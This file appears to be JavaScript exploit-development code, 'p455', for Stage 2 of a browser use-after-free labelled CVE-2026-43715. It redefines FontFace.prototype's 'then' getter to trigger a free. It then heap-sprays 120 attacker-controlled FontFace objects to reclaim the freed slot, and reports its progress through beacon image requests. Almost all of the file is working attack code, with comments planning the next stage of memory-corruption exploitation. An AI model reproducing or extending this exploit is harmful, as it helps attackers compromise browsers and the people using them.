// p455 — CVE-2026-43715 Stage 2: aim the slot with a JS-constructed
// FontFace (data-aiming)
// Beacon prefix: V455-
//
// Client census: the FontFace wrapper is the only sprayable
// CSSFontFaceClient (the set and selector are singletons), so
// class-aiming is out. p455 aims the DATA: instead of CSS-created
// faces, spray JS-constructed `new FontFace(fam, 'local(Songti)')`
// objects — same class (valid vtable, survives the dispatch), but
// every descriptor is attacker-chosen and we hold the reference from
// JS.
//
// Outcomes:
//   - FLIP-J<k> fires     -> a JS-constructed wrapper took the slot;
//     the confused fontLoaded landed on an object whose internals we
//     chose -> p456 varies them (family content/length, descriptors,
//     status at spray time) to map what the dispatch reads
//   - no flip, survive    -> JS wrappers allocate elsewhere (different
//     timing/size path) -> census tells us if they even coexist
//   - crash               -> JS wrapper layout differs where it matters

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V455-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var hits = 0;
  var jfaces = [];                    // hold refs so GC can't eat them

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here

        for (var k = 0; k < 120; k++) {
          var ff = new FontFace('j' + k, BAD);
          document.fonts.add(ff);
          jfaces.push(ff);               // JS-held, attacker-owned
        }
        B('SPRAYED-' + jfaces.length);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round0() {
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE'); return; }

    void face.loaded;
    B('LOAD-0');

    face.load().then(
      function() {
        B('SURVIVED-0-H' + hits);

        // hook every JS face's promise: whichever fires is the confused
        // dispatch landing on our own object
        var hooked = 0;
        for (var k = 0; k < jfaces.length; k++) {
          (function(ff, idx) {
            ff.loaded.then(
              function() { B('FLIP-J' + idx + '-S' + ff.status); },
              function() { B('REJ-J' + idx); }
            );
            hooked++;
          })(jfaces[k], k);
        }
        B('HOOKED-' + hooked);

        // census via status reads (belt and braces)
        var st = { unloaded: 0, loaded: 0, error: 0 };
        for (var m = 0; m < jfaces.length; m++) {
          st[jfaces[m].status] = (st[jfaces[m].status] || 0) + 1;
        }
        B('CEN-U' + st.unloaded + 'L' + st.loaded + 'E' + st.error);
      },
      function(e) { B('NO-0-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  round0();
  setTimeout(function() {
    var st = { unloaded: 0, loaded: 0, error: 0 };
    for (var m = 0; m < jfaces.length; m++) {
      st[jfaces[m].status] = (st[jfaces[m].status] || 0) + 1;
    }
    B('CEN3S-U' + st.unloaded + 'L' + st.loaded + 'E' + st.error +
      '-H' + hits);
  }, 3000);
})();
